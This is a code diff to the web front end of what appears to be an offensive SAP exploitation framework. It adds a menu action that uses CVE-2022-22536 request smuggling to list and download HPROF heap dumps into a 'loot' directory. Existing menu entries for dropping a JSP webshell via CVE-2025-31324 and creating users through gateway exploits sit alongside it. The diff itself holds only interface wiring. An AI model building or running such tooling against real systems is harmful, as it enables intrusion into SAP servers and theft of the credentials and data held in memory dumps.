@@ -751,6 +751,7 @@ body {
       <div class="ctx-item" data-action="create_user_java">&#128100; Create User (Java UME)</div>
       <div class="ctx-item" data-action="exploit_cve_31324_drop">&#128272; Drop JSP Webshell (CVE-2025-31324)</div>
       <div class="ctx-item" data-action="icmad_acl_bypass">&#9889; ICMAD ACL Bypass Sweep (CVE-2022-22536)</div>
+      <div class="ctx-item" data-action="icmad_heapdump_pull">&#128190; ICMAD &#8594; Pull Heap Dump (HPROF)</div>
       <div class="ctx-item" data-action="create_user_gw">&#128100; Create User (GW Exploit)</div>
       <div class="ctx-item" data-action="create_user_creds">&#128100; Create User (Credentials)</div>
       <div class="ctx-item" data-action="create_tcpip">&#128279; Create TCP/IP Dest (sapxpg)</div>
@@ -3073,6 +3074,9 @@ function showCtxMenu(e, sid) {
     'check_cve_22536':       isAbapStack || isJavaStack || !!n.is_web_dispatcher,
     'exploit_cve_31324_drop': hasCve31324,            // need confirmed CVE-2025-31324
     'icmad_acl_bypass':      !!n.cve_2022_22536_port, // need confirmed ICMAD port (live or patch-table)
+    'icmad_heapdump_pull':   !!(n.cve_2022_22536_acl_bypass
+                                  && n.cve_2022_22536_acl_bypass['/heapdump/']
+                                  && n.cve_2022_22536_acl_bypass['/heapdump/'].via === 'smuggle'),
     'create_user_java':      isJavaStack && (hasCve31324 || hasCve6287 || hasGwVuln),
     'betrusted':             hasMsPort,              // need a known MS port
     'create_user_betrusted': hasMsVuln || hasGwVuln, // need vulnerable MS or GW
@@ -3187,6 +3191,7 @@ function showCtxMenu(e, sid) {
     'check_cve_22536':       'Only applicable to ICM-fronted nodes (ABAP / Java / Web Dispatcher)',
     'exploit_cve_31324_drop': 'Run Check CVE-2025-31324 first; vulnerability required',
     'icmad_acl_bypass':       'Run Check CVE-2022-22536 first to discover a vulnerable ICM port',
+    'icmad_heapdump_pull':    'Run ICMAD ACL Bypass Sweep first; /heapdump/ must bypass to enable HPROF pull',
     'create_user_java':      'Requires Java / dual-stack system AND a usable CVE-2025-31324, RECON, or GW SAPXPG vuln',
     'create_user_gw':   'Requires a vulnerable RFC Gateway',
     'create_user_creds': 'Provide credentials first',
@@ -3717,6 +3722,42 @@ async function ctxAction(action) {
       if (outer === null) break;
       await api('POST', `node/${sid}/icmad_acl_bypass`, { outer_path: outer });
       showToast('ICMAD ACL-bypass sweep started — see console for per-path verdicts', 'info');
+      break;
+    }
+    case 'icmad_heapdump_pull': {
+      const outer = prompt(
+        'Outer POST path for the smuggle (must forward to backend):',
+        '/sap/admin/public/default.html'
+      );
+      if (outer === null) break;
+      // Step 1: list dumps
+      const listResp = await api('POST', `node/${sid}/icmad_heapdump_pull`,
+                                  { outer_path: outer });
+      if (!listResp || !listResp.dumps || listResp.dumps.length === 0) {
+        showToast('No HPROF files found via /heapdump/ — backend may have heap-dump servlet disabled, or the smuggle did not reach it', 'warn');
+        break;
+      }
+      // Step 2: prompt for which dump
+      const choice = prompt(
+        'Pick the HPROF to download (one per line — heap dumps can be 200 MB to 4 GB):\n\n'
+        + listResp.dumps.map((d, i) => `${i+1}. ${d}`).join('\n')
+        + '\n\nEnter the number or full filename:',
+        '1'
+      );
+      if (!choice) break;
+      let dump = choice.trim();
+      const idx = parseInt(dump, 10);
+      if (!isNaN(idx) && idx >= 1 && idx <= listResp.dumps.length) {
+        dump = listResp.dumps[idx - 1];
+      }
+      if (!confirm(
+        `Pull HPROF ${dump} from ${sid}?\n\n` +
+        'This streams the full heap dump (200 MB to 4 GB) to the loot ' +
+        'directory.  No retries on failure.  Continue?'
+      )) break;
+      await api('POST', `node/${sid}/icmad_heapdump_pull`,
+                { outer_path: outer, dump: dump });
+      showToast('ICMAD heap-dump pull started — see console for progress', 'info');
       break;
     }
     case 'check_linux_lpe':
